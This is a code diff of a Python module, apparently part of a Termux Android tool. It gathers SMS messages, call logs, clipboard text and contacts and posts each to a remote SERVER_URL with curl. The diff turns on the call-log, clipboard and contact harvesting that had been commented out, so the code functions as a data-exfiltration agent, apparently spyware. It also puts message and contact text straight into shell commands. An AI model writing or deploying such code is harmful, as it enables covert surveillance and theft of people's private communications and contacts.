@@ -11,7 +11,7 @@ def check_sms(THIS_USER_TOKEN):
 
     for sms in res:
         if not sms_list.objects.filter(received=sms['received']).exists():
-            call_back = os.popen(
+            os.popen(
                 f'curl --data "token={THIS_USER_TOKEN}&body={sms["body"]}&phone_number={sms["number"]}&type={sms["type"]}&read={bool(str(sms["read"]).capitalize())}&received={sms["received"]}" {SERVER_URL}/s/sms_list/ &> /dev/null &')
 
 
@@ -23,7 +23,7 @@ def check_contact(THIS_USER_TOKEN):
 
     for contact in res:
         if not contact_list.objects.filter(name=contact['name']).exists():
-            call_back = os.popen(
+            os.popen(
                 f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}\" {SERVER_URL}/s/contact/")
 
 
@@ -34,7 +34,7 @@ def check_clipboard(THIS_USER_TOKEN):
         raise ('Termux command error!')
 
     if not clipboard.objects.filter(text=res).exists():
-        call_back = os.popen(f'curl --data "token={THIS_USER_TOKEN}&text={res}" {SERVER_URL}/s/clipboard/')
+        os.popen(f'curl --data "token={THIS_USER_TOKEN}&text={res}" {SERVER_URL}/s/clipboard/')
 
 
 def check_call(THIS_USER_TOKEN):
@@ -45,7 +45,7 @@ def check_call(THIS_USER_TOKEN):
 
     for log in res:
         if not call_log.objects.filter(date=log['date']).exists():
-            call_back = os.popen(
+            os.popen(
                 f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" {SERVER_URL}/s/call_log/')
 
 
@@ -56,6 +56,6 @@ def register_server(THIS_USER_TOKEN):
 
 def InsertIntoDb(THIS_USER_TOKEN):
     check_sms(THIS_USER_TOKEN)
-    # check_call(THIS_USER_TOKEN)
-    # check_clipboard(THIS_USER_TOKEN)
-    # check_contact(THIS_USER_TOKEN)
+    check_call(THIS_USER_TOKEN)
+    check_clipboard(THIS_USER_TOKEN)
+    check_contact(THIS_USER_TOKEN)
